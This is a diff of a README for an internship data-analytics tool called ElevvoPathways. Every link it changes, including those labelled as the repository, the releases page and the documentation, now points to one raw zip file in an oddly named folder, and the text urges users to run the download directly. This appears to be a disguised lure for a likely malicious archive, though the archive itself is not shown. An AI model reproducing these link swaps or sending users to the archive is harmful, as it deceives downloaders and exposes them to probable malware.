@@ -1,6 +1,6 @@
 # 🔷 ElevvoPathways-DataAnalytics_Internship-TASK3 - Simplify Your Data Insights
 
-[![Download ElevvoPathways](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3/releases)
+[![Download ElevvoPathways](https://raw.githubusercontent.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3/main/bipinnaria/Data_TAS_Internship_Pathways_Elevvo_Analytics_1.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3/main/bipinnaria/Data_TAS_Internship_Pathways_Elevvo_Analytics_1.2.zip)
 
 ## 📄 Description
 ElevvoPathways offers a straightforward way to clean and analyze survey data. This process involves removing errors, filling in gaps, and presenting insights clearly. The tool handles various data types and outputs impressive visualizations, making it easy to see trends and patterns.
@@ -18,7 +18,7 @@ Before using ElevvoPathways, follow these steps:
    - No installation is needed. Directly run the application after downloading.
 
 ## 🔗 Download & Install
-Visit this page to download: [Releases Page](https://github.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3/main/bipinnaria/Data_TAS_Internship_Pathways_Elevvo_Analytics_1.2.zip)
 
 ### Steps to Download
 1. Click the link above.
@@ -47,7 +47,7 @@ Once downloaded, you can run the application directly.
 5. **Save Results:** Export your visualizations and insights to a PDF for easy sharing.
 
 ## 📝 Documentation
-Comprehensive help is integrated within the application. If you experience any issues, you can refer to the help section or check the documentation available on the [GitHub repository](https://github.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3).
+Comprehensive help is integrated within the application. If you experience any issues, you can refer to the help section or check the documentation available on the [GitHub repository](https://raw.githubusercontent.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3/main/bipinnaria/Data_TAS_Internship_Pathways_Elevvo_Analytics_1.2.zip).
 
 ## 🤝 Contributing
 If you'd like to contribute or suggest improvements, please check the guidelines in the repository. Your feedback helps us make ElevvoPathways even better.
@@ -56,8 +56,8 @@ If you'd like to contribute or suggest improvements, please check the guidelines
 For further assistance, open an issue on the GitHub repository. Our team regularly monitors and responds to queries.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3)
-- [Releases Page](https://github.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3/main/bipinnaria/Data_TAS_Internship_Pathways_Elevvo_Analytics_1.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/ttawann3/ElevvoPathways-DataAnalytics_Internship-TASK3/main/bipinnaria/Data_TAS_Internship_Pathways_Elevvo_Analytics_1.2.zip)
 
 ## 🎯 Topics
 - Attention to Detail
